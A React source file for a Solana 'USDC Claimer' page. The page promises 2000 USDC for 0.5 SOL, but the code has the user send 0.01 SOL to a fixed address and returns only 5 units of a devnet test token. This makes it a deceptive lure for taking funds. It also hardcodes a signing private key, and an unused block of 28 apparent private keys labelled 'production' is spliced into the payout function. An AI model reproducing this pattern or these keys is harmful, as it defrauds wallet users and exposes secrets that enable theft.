/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5yfKZRhsrfQYaUU3FLUjecm6c92NrxrW1KrkSaAYCwsC3PJniHYB4uNw6fBndVg8pyfphVLYPGuFoTrKyiud8E22"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3bqjTenuQFLHfyCEwQ8kMYYYEZRKv1rhLM5gWeuXrynV94mov38tFLotjy9GKuiQqQDJAJzDVUSQWctmbNYA1Zze",
  "key1": "58ugHWU1zXGc8JNzyrpqFHd184ZtNvzpYRxtJQhvvmGBDn8y2iVWk5PbBi1Pzj437CoSTDMJMcJMNPwhDgcqHd61",
  "key2": "42FnRd5eHnCKLTDQm5EeRtAWGuZLEnUarZyjUiig89K6waZYkkQtB8JEkA25jQ82Z88EhXSjWrrpT7m9mA79Bwct",
  "key3": "3uRLDDienCJVaEuBFP6PHLyhuEV1agkAQQm3kpMwZ9DEZ2EgsdKXCV6aF5JvM14SWaJjcBxC2x519SZk2yZQMnQ4",
  "key4": "5rx5N7Hjq3W1d8PHStG45pJit8yuELGJ4YA8XA21sqDTpdtqRgpHyXehnQfWM4JUdJMPxnUZkZT5PbmduxCNvwLz",
  "key5": "4fTDSkMw97v21QkUy1uCrgTkV1z1zrfugMxyWfhdaWF4JMAd7fbMiARW6ocxuWyL3tgNBpdFnNnP4uagjjua2r3X",
  "key6": "51WfHDqXQBV8TYqrNnFG2ChRd8HcyGtHuAxKDQpxHBHnzP6L8NnW9EGJhT5NvppVwMkoyFVPtx8gE2mPnDcPReBD",
  "key7": "4Fi7ZReTFGavrPjT6TCxWWAREc7MjJCN8SvPirssbY2SYKVYLUVXxXwURRGki2uwWodYbMxmHmi6YXY1Dk7UHYVL",
  "key8": "5r8nWne9jynFun3Co4wTX66mZE38wYFyQjP7fCMPKVkn8iYdmG1NKVRTWieoW2Hx5eyppJVtaVkmUvEhjXuGtbqp",
  "key9": "2hCkcHZmNnbnwH9C78MzHRawmhTaYuXGB3mnBxtsNwQKeANsRjd67TfbbU2s34caavsqNFkSTNthwxafNPqqeXPB",
  "key10": "yNTRXJ1ZerEZPtMhmR24Mr4QkMQ5dTmWkFPYB4Jta5nqB6GK6sJkRyyNsTUruCtauz2NMyzbpZghoyhacEFSH6Z",
  "key11": "D9xnrvb1y3zweeJVG9d1jdjnj5c2ytVGodLGq1CaHmY6pjpv5B19YcGiCpaTqUt1T213t5BXDwhv1HnsDbKXPF2",
  "key12": "yKbDgma19cVZro6Vm3R7McR9J2Gsbucd3YoBbPJM15wd5My138nLo5NZNc5bXh5emP798ZiBp6Xa1fs7SFCKM7z",
  "key13": "5xRrDjkQZFDeEw7j5BeVWCwLWeDuPdfSzacfREt6divJjsLrPceCgJxrBskTes7dwnGxizBmuhNHKercgWZ3pPJh",
  "key14": "eHeqiHqrh2ZxRmRSJaapaneL5bvCkZV1pkGuapKAgu1nm2YtBsXubFqn4Rdy5GrLNKj9rbrizZXbtcWdRMGxb6k",
  "key15": "5rYtvoaBn84hiadxEGtR7bz7AuyQQPYoWTqKXxzCswiaMhvzAkBZA1PCp9mGswoHv4Pkj1RQSD8g9MsEEFsENNcp",
  "key16": "4rQgPBNxYmzHPpZmUZ78ubp1AfRLuKfzgHzYA6gWhcenCA4tomujLzj3EyughopUENtZ9mcsVb4RxzMddNxcLiK",
  "key17": "3WmBDUetrfYVpSaLdATg7c2F5TZv59vaggkTNZ7RXddzvgBJUzx1BXMMwKqJva7No22ApkXoc7xoowXWxPLFf77S",
  "key18": "5eCcfTMy5nEitzLb9aPjHYqRKSehdJNAnV6yz6mg5mb9Bbc6q6QwGZUGCQokPcEEu5VDwEqMPLmsd38NGkuPMpZt",
  "key19": "3SymNKQhNrF6RTYfzx9HoA7QGfxspqnhm7jxYfUwRUrp5auSyiygDuksAHYsGYQSGV7Kt9ubm5BCnHQSnmntKwst",
  "key20": "4QZ9m8b7jhagg1PMqxM8KH6RrzjTVhTqB5cwBEEU4P7dULoyYdN8FXCdagic9BgfzDJ95zPp5RwMLCBKwVehcEyu",
  "key21": "rq3Jwio8hJPEKUnRK2WTxKAPmJC5tQKNrZadSFCa8Szq9cB3aomhe9DCJphGKRhMS1rSrky3F6thvS9MzXFJeLY",
  "key22": "3ZPa2F4ZRNzbxRRPJQQ5ZkWcoTmYPJkDQgh5bYoknecP1M5z9Gn1bzmRyeK1cs1vfxJUttp4T6cyHQssbeurZM51",
  "key23": "3nX5uY9gPau8aVQQzEJEUGakFMSzm5N79Kee17tmxM3eRiAK2ffcyaeYTHQnfwFJFU6EZ1t7qnG8rtZuCmG2jxzu",
  "key24": "zYBn85T7t8283EwVfbhy9s3454kyiNrp7rtS3v1Ab61bJ5YMeLkJHW3LS8La1Hhi5nc6kMmXQjdvsUf1Er6yFNh",
  "key25": "24eQ7K8vHsJWzhxn6q61iHqgxfviCgANgwDhiCpJC3cRBLkZcjpeRkCZhC3KH4ZZNtusPYc4xPJEWV8Zxt7mERrE",
  "key26": "5viuNxP7E2XehhVZ9rEsqHqB3qZSbp4PaU6nKC8Bz6kHHCadtXBMAkK21WgFWLU9q2QFGZpQ8pgyqnez8pp644XE",
  "key27": "adThsaJAdx2YabH9ZmKjaEJWKtfV4QGNMVRrVSMsh1iJCo9mjhBvnWK2hkitn9twRAbunM8kWutcr7XhBBdSF36"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
